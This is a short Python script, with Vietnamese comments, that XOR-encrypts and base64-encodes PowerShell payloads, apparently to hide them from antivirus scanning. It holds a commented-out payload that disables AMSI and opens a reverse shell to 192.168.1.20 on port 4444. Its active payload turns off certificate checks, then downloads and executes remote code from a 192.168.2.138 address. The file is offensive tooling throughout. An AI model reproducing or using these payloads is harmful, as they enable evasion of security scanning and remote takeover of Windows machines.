import base64

def xor_encrypt(data, key):
    key_bytes = key.encode()
    data_bytes = data.encode()
    output = bytearray()

    for i in range(len(data_bytes)):
        output.append(data_bytes[i] ^ key_bytes[i % len(key_bytes)])

    return base64.b64encode(output).decode()

def xor_decrypt(encoded, key):
    key_bytes = key.encode()
    data_bytes = base64.b64decode(encoded)
    output = bytearray()

    for i in range(len(data_bytes)):
        output.append(data_bytes[i] ^ key_bytes[i % len(key_bytes)])

    return output.decode()

# 🔐 Payload cần mã hóa
#original_payload = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$client=New-Object Net.Sockets.TCPClient('192.168.1.20',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte=[Text.Encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);}"
original_payload = "powershell -c Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('https://192.168.2.138/advanced_search/_rp'))))"
# 🔑 Khóa XOR
key = "secret"

# 🔄 Mã hóa
encoded = xor_encrypt(original_payload, key)
print("Encoded payload:\n", encoded)

# ✅ Giải mã lại để kiểm tra
decoded = xor_decrypt(encoded, key)
print("\nDecoded payload:\n", decoded)